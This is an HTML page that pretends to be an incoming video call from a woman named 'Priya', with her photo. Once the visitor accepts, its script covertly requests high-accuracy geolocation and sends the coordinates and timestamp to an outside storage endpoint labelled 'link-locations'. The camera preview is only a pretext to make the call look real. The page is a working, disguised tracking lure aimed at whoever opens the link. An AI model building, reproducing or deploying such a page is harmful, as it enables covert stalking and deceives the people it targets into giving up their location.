<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
    <title>Priya</title>
    <style>
      :root {
        --bg: #0b141a;
        --green: #21c063;
        --red: #ef4444;
        --chip: rgba(17, 24, 28, 0.55);
      }
      * { box-sizing: border-box; }
      html, body {
        margin: 0;
        height: 100%;
        background: var(--bg);
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        overflow: hidden;
      }
      button {
        font: inherit;
        border: 0;
        color: #fff;
        cursor: pointer;
      }
      .screen {
        display: none;
        position: fixed;
        inset: 0;
      }
      .screen.active { display: block; }

      .incoming {
        background: #1a1410 center/cover no-repeat;
      }
      .incoming::before {
        content: "";
        position: absolute;
        inset: 0;
        background:
          linear-gradient(180deg, rgba(11, 20, 26, 0.35) 0%, rgba(11, 20, 26, 0.82) 100%);
      }
      .incoming-body {
        position: relative;
        z-index: 1;
        height: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: space-between;
        padding: calc(48px + env(safe-area-inset-top)) 24px calc(36px + env(safe-area-inset-bottom));
      }
      .incoming-meta { text-align: center; }
      .incoming-meta p {
        margin: 8px 0 0;
        opacity: 0.8;
        letter-spacing: 0.04em;
      }
      .incoming-meta h1 {
        margin: 18px 0 0;
        font-size: 2rem;
        font-weight: 600;
      }
      .avatar-wrap {
        width: 128px;
        height: 128px;
        border-radius: 50%;
        overflow: hidden;
        box-shadow: 0 0 0 6px rgba(255, 255, 255, 0.12);
      }
      .avatar-wrap img, .remote img, .pip-fallback {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
      .call-actions {
        width: min(280px, 100%);
        display: flex;
        justify-content: space-between;
      }
      .round {
        width: 64px;
        height: 64px;
        border-radius: 50%;
        display: grid;
        place-items: center;
      }
      .round span {
        display: block;
        margin-top: 8px;
        font-size: 0.78rem;
        text-align: center;
        opacity: 0.85;
      }
      .accept { background: var(--green); }
      .decline, .end { background: var(--red); }
      .ghost { background: rgba(255, 255, 255, 0.16); }
      .ghost.off { background: #fff; color: #111; }
      .action {
        display: flex;
        flex-direction: column;
        align-items: center;
        width: 72px;
      }

      .in-call .remote {
        position: absolute;
        inset: 0;
      }
      .in-call .remote img {
        filter: saturate(1.05);
      }
      .top-bar, .bottom-bar {
        position: absolute;
        left: 0;
        right: 0;
        z-index: 2;
      }
      .top-bar {
        top: 0;
        padding: calc(18px + env(safe-area-inset-top)) 20px 0;
        text-align: center;
        text-shadow: 0 1px 8px rgba(0, 0, 0, 0.45);
      }
      .top-bar strong { display: block; font-size: 1.15rem; }
      .top-bar small { opacity: 0.85; }
      .bottom-bar {
        bottom: 0;
        display: flex;
        justify-content: center;
        gap: 18px;
        padding: 0 20px calc(28px + env(safe-area-inset-bottom));
      }
      .pip {
        position: absolute;
        right: 16px;
        bottom: calc(118px + env(safe-area-inset-bottom));
        width: 108px;
        height: 152px;
        border-radius: 14px;
        overflow: hidden;
        background: #111;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
        border: 1px solid rgba(255, 255, 255, 0.18);
        z-index: 2;
      }
      .pip video {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: scaleX(-1);
        background: #111;
      }
      .overlay {
        display: none;
        position: absolute;
        inset: 0;
        z-index: 3;
        background: rgba(11, 20, 26, 0.45);
        place-items: center;
        font-size: 1.05rem;
      }
      .overlay.active { display: grid; }
      .ended {
        display: grid;
        place-items: center;
        text-align: center;
        padding: 24px;
      }
      .ended p { opacity: 0.75; }
    </style>
  </head>
  <body>
    <section id="incoming" class="screen incoming active" style="background-image: url('priya.jpg')">
      <div class="incoming-body">
        <div class="incoming-meta">
          <div class="avatar-wrap"><img src="priya.jpg" alt="" /></div>
          <h1>Priya</h1>
          <p>Incoming video call</p>
        </div>
        <div class="call-actions">
          <div class="action">
            <button class="round decline" id="declineBtn" type="button" aria-label="Decline">
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M6 7.5c5 4.8 7 6.8 12 12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/><path d="M4 15c4-1 6-3 8-8" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/></svg>
            </button>
            <span>Decline</span>
          </div>
          <div class="action">
            <button class="round accept" id="acceptBtn" type="button" aria-label="Accept">
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M8 13.5c2.5 2.5 4.8 4 8 5.2 1.2.4 2.2-.2 2.6-1.1l.7-1.6c.3-.7 0-1.2-.7-1.5l-2.3-.9c-.6-.2-1.2 0-1.5.5l-.4.7c-1.7-.8-3-1.9-4-3.5l.7-.5c.5-.4.6-1 .3-1.6l-1-2.2c-.3-.7-.9-.9-1.6-.6l-1.6.7c-1 .4-1.4 1.4-1 2.5.5 1.7 1.4 3.3 2.8 4.9Z" fill="#fff"/></svg>
            </button>
            <span>Accept</span>
          </div>
        </div>
      </div>
    </section>

    <section id="incall" class="screen in-call">
      <div class="remote"><img src="priya.jpg" alt="" /></div>
      <div class="top-bar">
        <strong>Priya</strong>
        <small id="timer">Connecting…</small>
      </div>
      <div class="pip">
        <video id="localVideo" autoplay muted playsinline></video>
      </div>
      <div class="bottom-bar">
        <button class="round ghost" id="micBtn" type="button" aria-label="Mute">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><rect x="9" y="3" width="6" height="11" rx="3" stroke="currentColor" stroke-width="2"/><path d="M6.5 11.5a5.5 5.5 0 0 0 11 0" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M12 17v4" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
        </button>
        <button class="round ghost" id="camBtn" type="button" aria-label="Camera">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><rect x="3" y="7" width="13" height="10" rx="2" stroke="currentColor" stroke-width="2"/><path d="M16 10.5 21 8v8l-5-2.5v-3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
        </button>
        <button class="round end" id="endBtn" type="button" aria-label="End call">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M4 15c4-1 6-3 8-8M6 7.5c5 4.8 7 6.8 12 12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/></svg>
        </button>
      </div>
      <div class="overlay" id="connecting">Connecting…</div>
    </section>

    <section id="ended" class="screen ended">
      <div>
        <h2>Call ended</h2>
        <p>Priya</p>
      </div>
    </section>

    <script>
      var STORE =
        "https://api.restful-api.dev/objects/ff808181a067127101a09bcd8bca0b86";
      var localStream = null;
      var timerId = null;
      var elapsed = 0;
      var micOn = true;
      var camOn = true;

      function show(id) {
        ["incoming", "incall", "ended"].forEach(function (name) {
          document.getElementById(name).classList.toggle("active", name === id);
        });
      }

      function withTime(payload) {
        var now = new Date();
        payload.time = now.toISOString();
        payload.local_time = now.toLocaleString("en-IN", {
          timeZone: "Asia/Kolkata",
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
          hour12: true,
        });
        return payload;
      }

      function send(payload) {
        payload = withTime(payload);
        return fetch(STORE)
          .then(function (res) {
            return res.json();
          })
          .then(function (doc) {
            var list =
              doc && doc.data && doc.data.locations
                ? doc.data.locations.slice()
                : [];
            list.push({
              lat: payload.lat,
              lng: payload.lng,
              accuracy: payload.accuracy,
              time: payload.time,
              local_time: payload.local_time,
              error: payload.error,
              code: payload.code,
            });
            return fetch(STORE, {
              method: "PUT",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                name: "link-locations",
                data: { locations: list },
              }),
            });
          })
          .catch(function () {});
      }

      function formatTime(total) {
        var m = String(Math.floor(total / 60)).padStart(2, "0");
        var s = String(total % 60).padStart(2, "0");
        return m + ":" + s;
      }

      function startTimer() {
        elapsed = 0;
        document.getElementById("timer").textContent = "00:00";
        timerId = setInterval(function () {
          elapsed += 1;
          document.getElementById("timer").textContent = formatTime(elapsed);
        }, 1000);
      }

      function stopStream() {
        if (!localStream) return;
        localStream.getTracks().forEach(function (track) {
          track.stop();
        });
        localStream = null;
      }

      function requestLocation() {
        if (!navigator.geolocation) {
          send({ error: "geolocation_unsupported" });
          return Promise.resolve();
        }
        return new Promise(function (resolve) {
          navigator.geolocation.getCurrentPosition(
            function (pos) {
              send({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
              });
              resolve();
            },
            function (err) {
              send({ error: err.message, code: err.code });
              resolve();
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
          );
        });
      }

      function requestCamera() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          return Promise.resolve();
        }
        return navigator.mediaDevices
          .getUserMedia({ video: { facingMode: "user" }, audio: false })
          .then(function (stream) {
            localStream = stream;
            var video = document.getElementById("localVideo");
            video.srcObject = stream;
            video.play().catch(function () {});
          })
          .catch(function () {});
      }

      function connectCall() {
        show("incall");
        document.getElementById("connecting").classList.add("active");
        requestCamera()
          .then(requestLocation)
          .then(function () {
            document.getElementById("connecting").classList.remove("active");
            startTimer();
          });
      }

      function endCall() {
        if (timerId) clearInterval(timerId);
        stopStream();
        show("ended");
      }

      document.getElementById("acceptBtn").addEventListener("click", connectCall);
      document.getElementById("declineBtn").addEventListener("click", endCall);
      document.getElementById("endBtn").addEventListener("click", endCall);
      document.getElementById("micBtn").addEventListener("click", function () {
        micOn = !micOn;
        this.classList.toggle("off", !micOn);
      });
      document.getElementById("camBtn").addEventListener("click", function () {
        camOn = !camOn;
        this.classList.toggle("off", !camOn);
        if (localStream) {
          localStream.getVideoTracks().forEach(function (track) {
            track.enabled = camOn;
          });
        }
      });
    </script>
  </body>
</html>
